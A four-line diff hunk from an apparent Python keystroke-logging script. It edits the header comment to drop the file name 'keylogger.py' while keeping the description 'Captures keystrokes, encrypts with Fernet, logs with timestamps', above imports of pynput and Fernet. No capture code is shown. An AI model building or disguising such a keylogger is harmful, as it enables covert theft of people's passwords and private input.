@@ -1,4 +1,4 @@
-# keylogger.py — Captures keystrokes, encrypts with Fernet, logs with timestamps
+# Captures keystrokes, encrypts with Fernet, logs with timestamps
 
 from pynput import keyboard
 from cryptography.fernet import Fernet
